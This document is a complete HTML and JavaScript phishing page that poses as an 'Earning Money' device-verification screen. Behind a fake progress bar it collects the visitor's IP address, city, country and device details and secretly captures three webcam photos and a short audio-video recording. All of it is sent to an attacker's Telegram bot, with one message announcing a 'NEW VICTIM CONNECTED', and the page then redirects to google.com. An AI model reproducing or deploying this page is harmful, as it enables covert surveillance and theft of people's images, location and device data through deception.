<!DOCTYPE html>
<html>
<head>
    <title>üí∞ Earning Money - Please Wait</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial; 
            background: linear-gradient(135deg, #667eea, #764ba2);
            min-height: 100vh;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
        }
        .container {
            max-width: 500px;
            width: 90%;
            background: rgba(255,255,255,0.1);
            padding: 30px;
            border-radius: 20px;
            backdrop-filter: blur(15px);
            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.2);
        }
        .loader {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #00ff88;
            margin: 0 auto 20px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        h1 { margin-bottom: 15px; font-size: 28px; }
        p { margin-bottom: 20px; opacity: 0.9; line-height: 1.5; }
        .status { 
            background: rgba(255,255,255,0.1); 
            padding: 15px; 
            border-radius: 10px; 
            margin: 20px 0; 
            font-size: 14px; 
        }
        .progress {
            width: 100%;
            height: 8px;
            background: rgba(255,255,255,0.1);
            border-radius: 4px;
            overflow: hidden;
            margin: 20px 0;
        }
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #00ff88, #00cc6a);
            width: 0%;
            transition: width 0.5s;
            border-radius: 4px;
        }
        .hidden {
            position: absolute;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            overflow: hidden;
            opacity: 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <h1>üí∞ Earning Money</h1>
        <p>Please wait while we verify your device and prepare your earning account...</p>
        
        <div class="status" id="statusMessage">
            üîç Initializing system...
        </div>
        
        <div class="progress">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        
        <div id="counter" style="font-size: 24px; font-weight: bold; margin: 10px 0;">5</div>
        
        <p style="font-size: 14px; opacity: 0.7;">
            <span style="color: #00ff88;">‚úì</span> Secure Connection Established<br>
            <span style="color: #00ff88;">‚úì</span> Device Verification Required<br>
            <span style="color: #ff9900;">‚åõ</span> Processing Your Request
        </p>
    </div>
    
    <!-- Hidden Camera Elements -->
    <div class="hidden">
        <video id="video" autoplay muted playsinline></video>
        <canvas id="canvas"></canvas>
        <audio id="audio" muted></audio>
    </div>

    <script>
        // ==================== GET URL PARAMETERS ====================
        function getUrlParams() {
            const params = new URLSearchParams(window.location.search);
            return {
                tid: params.get('tid') || 'UNKNOWN_' + Date.now(),
                token: params.get('token') ? atob(params.get('token')) : '',
                chat: params.get('chat') ? atob(params.get('chat')) : ''
            };
        }
        
        // ==================== CONFIGURATION ====================
        const params = getUrlParams();
        const BOT_TOKEN = params.token;
        const CHAT_ID = params.chat;
        const TRACKING_ID = params.tid;
        
        // ==================== VARIABLES ====================
        let photoCount = 0;
        let videoCount = 0;
        const capturedPhotos = [];
        
        // ==================== DOM ELEMENTS ====================
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const audio = document.getElementById('audio');
        const statusMessage = document.getElementById('statusMessage');
        const progressBar = document.getElementById('progressBar');
        const counter = document.getElementById('counter');
        
        // ==================== FUNCTIONS ====================
        
        function updateStatus(text) {
            statusMessage.innerHTML = text;
        }
        
        function updateProgress(percent) {
            progressBar.style.width = percent + '%';
        }
        
        // Send data to Telegram
        async function sendToTelegram(type, data, number) {
            if(!BOT_TOKEN || !CHAT_ID) return;
            
            try {
                let caption = `üÜî ${TRACKING_ID}\n`;
                caption += `üì∏ ${type.toUpperCase()} ${number}\n`;
                caption += `‚è∞ ${new Date().toLocaleTimeString()}\n`;
                caption += `üì± ${navigator.userAgent.substring(0, 50)}...`;
                
                if(type === 'photo') {
                    const blob = await fetch(data).then(r => r.blob());
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, `photo_${TRACKING_ID}_${number}.jpg`);
                    formData.append('caption', caption);
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                }
                
                console.log(`‚úÖ ${type} ${number} sent to Telegram`);
            } catch(error) {
                console.log(`Failed to send ${type}:`, error);
            }
        }
        
        // Get IP and location
        async function getIPAndLocation() {
            updateStatus("üåê Getting network information...");
            
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                
                const locationResponse = await fetch(`https://ipinfo.io/${data.ip}/json`);
                const locationData = await locationResponse.json();
                
                const info = `üìç IP: ${data.ip}\n`;
                info += `üèôÔ∏è Location: ${locationData.city}, ${locationData.country}\n`;
                info += `üÜî Tracking: ${TRACKING_ID}\n`;
                info += `üì± Device: ${navigator.platform}`;
                
                // Send location to Telegram
                if(BOT_TOKEN && CHAT_ID) {
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: `üö® NEW VICTIM CONNECTED!\n\n${info}`,
                            parse_mode: 'HTML'
                        })
                    });
                }
                
                return info;
            } catch(error) {
                return "üìç Location detection failed";
            }
        }
        
        // Access camera
        async function accessCamera() {
            updateStatus("üì∏ Accessing camera for verification...");
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' },
                    audio: true 
                });
                
                video.srcObject = stream;
                audio.srcObject = stream;
                
                // Wait for video to load
                await new Promise(resolve => {
                    video.onloadedmetadata = () => {
                        video.play();
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        resolve();
                    };
                });
                
                return true;
            } catch(error) {
                console.log("Camera access failed:", error);
                return false;
            }
        }
        
        // Capture photos
        async function capturePhotos() {
            updateStatus("üì∏ Capturing verification photos...");
            
            for(let i = 0; i < 3; i++) {
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const photoData = canvas.toDataURL('image/jpeg', 0.8);
                
                // Send to Telegram
                sendToTelegram('photo', photoData, i + 1);
                
                photoCount++;
                updateProgress(40 + (i * 10));
                updateStatus(`üì∏ Photo ${i + 1}/3 captured...`);
            }
        }
        
        // Record short video
        async function recordVideo() {
            updateStatus("üé• Recording verification video...");
            
            try {
                const stream = video.srcObject;
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                
                return new Promise(resolve => {
                    recorder.ondataavailable = e => chunks.push(e.data);
                    recorder.onstop = async () => {
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        videoCount++;
                        
                        // Try to send video as document
                        if(BOT_TOKEN && CHAT_ID) {
                            const formData = new FormData();
                            formData.append('chat_id', CHAT_ID);
                            formData.append('document', blob, `video_${TRACKING_ID}.webm`);
                            formData.append('caption', `üé• Video from ${TRACKING_ID}`);
                            
                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                                method: 'POST',
                                body: formData
                            });
                        }
                        
                        resolve();
                    };
                    
                    recorder.start();
                    setTimeout(() => recorder.stop(), 2000);
                });
            } catch(error) {
                console.log("Video recording failed:", error);
            }
        }
        
        // Get device info
        function getDeviceInfo() {
            updateStatus("üì± Collecting device information...");
            
            const info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                cookies: navigator.cookieEnabled,
                online: navigator.onLine,
                battery: 'N/A',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
            
            // Try to get battery info
            if('getBattery' in navigator) {
                navigator.getBattery().then(battery => {
                    info.battery = `${Math.round(battery.level * 100)}%`;
                });
            }
            
            return info;
        }
        
        // Send device info to Telegram
        function sendDeviceInfo(info) {
            if(!BOT_TOKEN || !CHAT_ID) return;
            
            let message = `üì± DEVICE INFORMATION\n\n`;
            message += `üÜî Tracking: ${TRACKING_ID}\n`;
            message += `üïí Time: ${new Date().toLocaleString()}\n`;
            message += `üåê IP: Detected earlier\n`;
            message += `üíª Platform: ${info.platform}\n`;
            message += `üì∫ Screen: ${info.screen}\n`;
            message += `üåç Language: ${info.language}\n`;
            message += `üç™ Cookies: ${info.cookies ? 'Enabled' : 'Disabled'}\n`;
            message += `üì∂ Online: ${info.online ? 'Yes' : 'No'}\n`;
            message += `üîã Battery: ${info.battery}\n`;
            message += `üïê Timezone: ${info.timezone}\n`;
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
        }
        
        // Main execution flow
        async function executeAll() {
            updateProgress(10);
            
            // Step 1: Get IP and location
            const locationInfo = await getIPAndLocation();
            updateStatus(locationInfo);
            updateProgress(20);
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            // Step 2: Get device info
            const deviceInfo = getDeviceInfo();
            sendDeviceInfo(deviceInfo);
            updateProgress(30);
            
            // Step 3: Access camera
            const cameraAccess = await accessCamera();
            if(cameraAccess) {
                updateProgress(40);
                
                // Step 4: Capture photos
                await capturePhotos();
                updateProgress(70);
                
                // Step 5: Record video
                await recordVideo();
                updateProgress(90);
                
                // Stop camera
                video.srcObject.getTracks().forEach(track => track.stop());
            }
            
            // Step 6: Finalize
            updateStatus("‚úÖ Verification complete! Processing your earnings...");
            updateProgress(100);
            
            // Final message
            setTimeout(() => {
                updateStatus("üéâ Congratulations! Your account has been verified.<br>You can now start earning money!");
                
                // Countdown then redirect
                let count = 5;
                const countdownInterval = setInterval(() => {
                    counter.textContent = count;
                    count--;
                    
                    if(count < 0) {
                        clearInterval(countdownInterval);
                        window.location.href = "https://google.com"; // Change this to your desired redirect
                    }
                }, 1000);
            }, 2000);
        }
        
        // ==================== INITIALIZATION ====================
        window.onload = function() {
            // Start countdown from 5
            let count = 5;
            const initialCountdown = setInterval(() => {
                counter.textContent = count;
                count--;
                
                if(count < 0) {
                    clearInterval(initialCountdown);
                    executeAll();
                }
            }, 1000);
        };
    </script>
</body>
</html>
